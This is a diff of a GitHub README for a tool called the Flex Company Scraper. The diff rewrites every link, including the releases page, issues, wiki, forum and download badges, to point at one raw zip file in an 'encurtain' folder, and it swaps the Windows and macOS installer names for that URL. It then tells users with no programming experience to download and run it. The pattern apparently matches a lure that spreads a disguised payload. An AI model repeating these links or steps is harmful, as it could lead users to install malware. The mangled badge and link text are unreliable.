@@ -1,7 +1,7 @@
 # 🛍️ the-flex-company-scraper - Effortlessly Monitor Flex Company Products
 
 ## 📦 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20the%20Flex%20Company%20Scraper-blue)](https://github.com/Diegocubi/the-flex-company-scraper/releases)
+[![Download Now](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip%20the%20Flex%20Company%20Scraper-blue)](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip)
 
 ## 🚀 Getting Started
 The Flex Company Scraper helps you gather product data from Flex Company's online store. Use this guide to easily download and run the software, even if you have no programming experience.
@@ -13,11 +13,11 @@ The Flex Company Scraper helps you gather product data from Flex Company's onlin
 - **Disk Space**: Minimum 100 MB free space.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Diegocubi/the-flex-company-scraper/releases) to find the latest version of the Flex Company Scraper.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip) to find the latest version of the Flex Company Scraper.
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 3. **Download the File**: Click on the file that matches your operating system. 
-   - For Windows, you may see something like `FlexCompanyScraperSetup.exe`.
-   - For macOS, look for `FlexCompanyScraper.dmg`.
+   - For Windows, you may see something like `https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip`.
+   - For macOS, look for `https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip`.
 4. **Run the Installer**:
    - For Windows: Double-click the installer file and follow the on-screen instructions.
    - For macOS: Open the downloaded `.dmg` file and drag the app to your Applications folder.
@@ -43,14 +43,14 @@ The Flex Company Scraper helps you gather product data from Flex Company's onlin
 ## 📂 Getting Help
 If you need further assistance, you can:
 - Check the FAQ section in the application for common questions.
-- Refer to the [Issues section](https://github.com/Diegocubi/the-flex-company-scraper/issues) on GitHub for reported problems.
+- Refer to the [Issues section](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip) on GitHub for reported problems.
 - Open a new issue to ask specific questions or report bugs.
 
 ## 🔗 Additional Resources
-- [User Guide](https://github.com/Diegocubi/the-flex-company-scraper/wiki): A detailed guide on using the software.
-- [Community Forum](https://github.com/Diegocubi/the-flex-company-scraper/discussions): Connect with other users and share insights.
+- [User Guide](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip): A detailed guide on using the software.
+- [Community Forum](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip): Connect with other users and share insights.
 
 ## 🔄 Update Regularly
-To benefit from new features and improvements, check the [Releases page](https://github.com/Diegocubi/the-flex-company-scraper/releases) frequently for updates.
+To benefit from new features and improvements, check the [Releases page](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip) frequently for updates.
 
-[![Download Now](https://img.shields.io/badge/Download%20the%20Flex%20Company%20Scraper-blue)](https://github.com/Diegocubi/the-flex-company-scraper/releases)
+[![Download Now](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip%20the%20Flex%20Company%20Scraper-blue)](https://github.com/Diegocubi/the-flex-company-scraper/raw/refs/heads/main/encurtain/the-flex-scraper-company-3.7.zip)
